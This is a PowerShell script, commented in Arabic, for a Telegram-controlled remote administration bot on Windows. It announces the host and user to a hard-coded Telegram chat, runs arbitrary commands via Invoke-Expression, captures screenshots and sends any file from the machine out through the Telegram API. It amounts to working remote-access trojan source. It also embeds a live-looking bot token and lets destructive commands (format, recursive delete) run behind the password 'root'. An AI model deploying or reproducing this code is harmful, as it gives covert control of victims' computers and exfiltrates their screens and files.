<#
    ██████╗  ██████╗ ████████╗    ███████╗██████╗ ██╗   ██╗██████╗ ███████╗██████╗ 
    ██╔══██╗██╔═══██╗╚══██╔══╝    ██╔════╝██╔══██╗██║   ██║██╔══██╗██╔════╝██╔══██╗
    ██████╔╝██║   ██║   ██║       █████╗  ██████╔╝██║   ██║██████╔╝█████╗  ██████╔╝
    ██╔══██╗██║   ██║   ██║       ██╔══╝  ██╔══██╗██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗
    ██║  ██║╚██████╔╝   ██║       ███████╗██║  ██║╚██████╔╝██║     ███████╗██║  ██║
    ╚═╝  ╚═╝ ╚═════╝    ╚═╝       ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
    
    بوت Telegram متقدم للإدارة عن بعد مع:
    - التحقق من الهوية المزدوج (Chat ID + User ID)
    - دعم كامل للأوامر الخطرة (بما في ذلك format وrmdir)
    - نظام معالجة أخطاء متقدم
    - تعليقات توضيحية كاملة
    - دعم جميع المسارات بدون قيود
#>

# ========== 🛠 إعدادات التكوين ==========
$config = @{
    TelegramToken = "7993044710:AAEdKGGcUnV093cRtdQQiNqTGuiETgl-658"  # 🔑 توكن البوت
    AllowedChatID = "8085876352"                                      # 💬 معرف الدردشة المسموح
    AllowedUserID = "8085876352"                                       # 👤 معرف المستخدم المسموح
    AdminPassword = "root"                            # 🛡 كلمة سر إضافية للأوامم الخطرة
    MaxFileSizeMB = 100                                                # 📦 الحد الأقصى لحجم الملف (MB)
    CommandCooldown = 1                                               # ⏱ زمن التبريد بين الأوامر (ثواني)
}

# ========== 📜 قائمة الأوامر المحظورة (يمكن تعديلها) ==========
$DANGEROUS_CMDS = @(
    "format", 
    "rmdir", 
    "del /f /s /q", 
    "shutdown",
    "Remove-Item -Recurse -Force",
    "Stop-Computer -Force"
)

# ========== 📝 نظام تسجيل الأحداث ==========
function Write-Log {
    param([string]$Message)
    $logFile = "$env:TEMP\TelegramBot_$(Get-Date -Format 'yyyyMMdd').log"
    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message" | Out-File $logFile -Append
}

# ========== 📨 إرسال رسائل Telegram ==========
function Send-Telegram {
    param(
        [string]$Message,
        [string]$FilePath = $null,
        [switch]$IsWarning = $false
    )
    
    try {
        $apiURL = "https://api.telegram.org/bot$($config.TelegramToken)"
        
        # إضافة تحذير إذا كانت الرسالة خطيرة
        if ($IsWarning) { $Message = "⚠️ [تحذير] ⚠️`n" + $Message }
        
        if ($FilePath -and (Test-Path $FilePath)) {
            $fileSize = (Get-Item $FilePath).Length / 1MB
            if ($fileSize -gt $config.MaxFileSizeMB) {
                Send-Telegram -Message "❌ الملف كبير جدًا (الحد الأقصى $($config.MaxFileSizeMB)MB" -IsWarning
                return
            }
            
            Invoke-RestMethod -Uri "$apiURL/sendDocument" -Method Post -Form @{
                chat_id = $config.AllowedChatID
                document = Get-Item $FilePath
            } -TimeoutSec 30 | Out-Null
        } else {
            Invoke-RestMethod -Uri "$apiURL/sendMessage" -Method POST -Body @{
                chat_id = $config.AllowedChatID
                text = $Message
                parse_mode = "Markdown"
            } -TimeoutSec 15 | Out-Null
        }
    } catch {
        Write-Log -Message "فشل إرسال الرسالة: $_"
    }
}

# ========== 🔍 التحقق من الهوية المزدوج ==========
function Verify-Identity {
    param($Update)
    
    # التحقق من Chat ID
    if ($Update.message.chat.id -ne $config.AllowedChatID) {
        Write-Log -Message "محاولة وصول غير مصرح بها من Chat ID: $($Update.message.chat.id)"
        return $false
    }
    
    # التحقق من User ID
    if ($Update.message.from.id -ne $config.AllowedUserID) {
        Write-Log -Message "محاولة وصول غير مصرح بها من User ID: $($Update.message.from.id)"
        return $false
    }
    
    return $true
}

# ========== ⚠️ التحقق من الأوامر الخطرة ==========
function Test-DangerousCommand {
    param([string]$Command)
    
    foreach ($dangerCmd in $DANGEROUS_CMDS) {
        if ($Command -like "*$dangerCmd*") {
            return $true
        }
    }
    return $false
}

# ========== 💻 تنفيذ الأوامر ==========
function Execute-Command {
    param([string]$Command, [string]$Password)
    
    try {
        # التحقق من الأوامر الخطرة
        if (Test-DangerousCommand -Command $Command) {
            if ($Password -ne $config.AdminPassword) {
                return "⛔ الأمر يتطلب كلمة سر خاصة!"
            }
            
            Write-Log -Message "تم تنفيذ أمر خطير: $Command"
            $output = "[تحذير] تم تنفيذ أمر خطير:`n"
        }
        
        # تنفيذ الأمر
        $result = Invoke-Expression $Command 2>&1 | Out-String
        $output += $result.Trim()
        
        if ($output.Length -gt 4000) {
            $output = $output.Substring(0, 4000) + "... (تم اقتطاع الناتج)"
        }
        
        return $output
    } catch {
        $errorMsg = "❌ فشل التنفيذ: $_"
        Write-Log -Message $errorMsg
        return $errorMsg
    }
}

# ========== 📸 التقاط لقطة الشاشة ==========
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        
        $g.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bmp.Size)
        
        $path = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMddHHmmss').png"
        $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        
        return $path
    } catch {
        Write-Log -Message "فشل التقاط لقطة الشاشة: $_"
        return $null
    } finally {
        if ($g) { $g.Dispose() }
        if ($bmp) { $bmp.Dispose() }
    }
}

# ========== 🚀 إرسال إشعار البدء ==========
Send-Telegram -Message "🚀 البوت يعمل الآن على [$($env:COMPUTERNAME)]
👤 المستخدم: $($env:USERNAME)
🕒 الوقت: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
💻 الأوامم المتاحة: /help"

# ========== 🔄 حلقة الأوامر الرئيسية ==========
function Start-CommandListener {
    $offset = 0
    
    while ($true) {
        try {
            $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($config.TelegramToken)/getUpdates?offset=$offset&timeout=20" -ErrorAction Stop
            
            foreach ($update in $updates.result) {
                $offset = $update.update_id + 1
                
                # التحقق من الهوية
                if (-not (Verify-Identity -Update $update)) {
                    continue
                }
                
                $text = $update.message.text
                $command = $text -split '\s+' | Select-Object -First 1
                $arguments = $text.Substring($command.Length).Trim()
                
                switch -Regex ($command.ToLower()) {
                    "^/help$" {
                        $helpMsg = @"
📜 *قائمة الأوامر المتاحة*:

🔹 *معلومات النظام*
/info - عرض معلومات النظام

🔹 *لقطات الشاشة*
/screenshot - التقاط لقطة للشاشة

🔹 *تنفيذ الأوامر*
/cmd [أمر] - تنفيذ أمر (مثال: `/cmd dir C:\`)
/pw [كلمة السر] [أمر] - تنفيذ أمر خطير

🔹 *إدارة الملفات*
/download [مسار] - تنزيل ملف
/upload [رابط] - رفع ملف من رابط

🔹 *إدارة البوت*
/exit - إيقاف البوت
"@
                        Send-Telegram -Message $helpMsg
                    }
                    
                    "^/info$" {
                        $info = Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version
                        $cpu = Get-WmiObject Win32_Processor | Select-Object -ExpandProperty Name
                        $ram = "{0:N2}GB" -f ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
                        
                        $sysInfo = @"
🖥️ *معلومات النظام*:
• *OS*: $($info.Caption) [$($info.Version)]
• *CPU*: $cpu
• *RAM*: $ram
• *الجهاز*: $($env:COMPUTERNAME)
• *المستخدم*: $($env:USERNAME)
• *الوقت*: $(Get-Date -Format 'HH:mm:ss')
"@
                        Send-Telegram -Message $sysInfo
                    }
                    
                    "^/screenshot$" {
                        $screenshotPath = Take-Screenshot
                        if ($screenshotPath) {
                            Send-Telegram -Message "📸 تم التقاط لقطة الشاشة" -FilePath $screenshotPath
                            Remove-Item $screenshotPath -Force
                        } else {
                            Send-Telegram -Message "❌ فشل التقاط لقطة الشاشة" -IsWarning
                        }
                    }
                    
                    "^/cmd (.+)" {
                        $output = Execute-Command -Command $matches[1] -Password ""
                        Send-Telegram -Message "💻 نتيجة الأمر:`n`n```$output```"
                    }
                    
                    "^/pw (.+?) (.+)" {
                        $password = $matches[1]
                        $cmd = $matches[2]
                        
                        $output = Execute-Command -Command $cmd -Password $password
                        Send-Telegram -Message "🔐 نتيجة الأمر الخطير:`n`n```$output```" -IsWarning
                    }
                    
                    "^/download (.+)" {
                        $filePath = $matches[1].Trim()
                        
                        if (Test-Path $filePath) {
                            Send-Telegram -Message "⬇️ جاري تنزيل الملف..." -FilePath $filePath
                        } else {
                            Send-Telegram -Message "❌ الملف غير موجود: $filePath" -IsWarning
                        }
                    }
                    
                    "^/exit$" {
                        Send-Telegram -Message "🛑 جاري إيقاف البوت..."
                        exit 0
                    }
                    
                    default {
                        Send-Telegram -Message "⚠️ أمر غير معروف! اكتب /help لعرض الأوامر المتاحة"
                    }
                }
                
                Start-Sleep -Seconds $config.CommandCooldown
            }
        } catch {
            Write-Log -Message "خطأ في الاتصال: $_"
            Start-Sleep -Seconds 5
        }
    }
}

# بدء الاستماع للأوامر
Start-CommandListener
